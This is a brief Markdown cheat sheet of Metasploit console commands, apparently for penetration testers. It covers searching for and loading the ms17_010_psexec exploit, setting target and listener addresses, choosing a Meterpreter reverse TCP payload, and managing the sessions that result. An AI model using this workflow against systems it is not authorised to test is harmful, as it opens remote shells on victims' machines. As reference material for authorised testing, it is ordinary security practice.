---
description: Quick module search, check, and session commands.
---

# Metasploit

Use this page as a quick command reference for Metasploit.

Use this when you need to search modules, set options, and manage sessions.

### Start the console

```bash
msfconsole
```

### Search for a module

```bash
search ms17-010
search type:exploit smb
search platform:windows type:exploit eternalblue
```

### Load a module

```bash
use exploit/windows/smb/ms17_010_psexec
```

### Review module options

```bash
show options
show payloads
info
```

### Set common values

```bash
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```

### Check before exploit

```bash
check
run
exploit
```

### Manage sessions

```bash
sessions
sessions -i <ID>
background
```

### Global values

```bash
setg LHOST <YOUR_IP>
setg RHOSTS <TARGET_IP>
```

### Common workflow

```bash
search <SERVICE> <VERSION>
use <MODULE>
show options
set RHOSTS <TARGET_IP>
set LHOST <YOUR_IP>
check
run
sessions -i <ID>
```

### Reminder

* Confirm the target version first.
* Use `check` when the module supports it.
* Read `info` before you run the exploit.
